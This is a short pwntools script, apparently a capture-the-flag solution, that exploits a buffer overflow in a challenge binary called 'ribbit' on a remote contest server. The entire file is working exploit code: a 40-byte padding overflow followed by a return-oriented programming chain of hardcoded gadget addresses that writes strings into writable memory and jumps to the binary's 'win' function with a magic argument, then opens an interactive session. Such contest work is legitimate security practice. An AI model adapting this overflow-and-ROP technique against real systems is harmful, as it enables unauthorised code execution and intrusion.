from pwn import *

elf = context.binary = ELF("ribbit")
#r = process()
r = remote("chal.nbctf.com", 30170)

POP_RSI = p64(0x000000000040a04e)
POP_RDI = p64(0x000000000040201f)
POP_RDX = p64(0x000000000047fe1a)
POP_RCX = p64(0x000000000048ac6b)
WRITABLE = 0x004c50e0
MOV = p64(0x000000000049346a) #0x000000000049346a: mov qword ptr [rcx], rdx; ret; 

def write(address, value):
    value=[value[i:i+8] for i in range(0, len(value), 8)]
    
    chain=b""

    for i in range(len(value)):
        chain+= POP_RDX + p64(u64(value[i])) + POP_RCX + p64(WRITABLE+8*i) + MOV

    return chain

to_write = b"You got this!"+b"\x00"*8+b"Just do it!"+b"\x00"*8

payload = b"A"*40 + write(WRITABLE, to_write) + POP_RDI + p64(0xf10c70b33f) + POP_RSI + p64(WRITABLE) + p64(elf.sym["win"])

#gdb.attach(r)

r.sendline(payload)

r.interactive()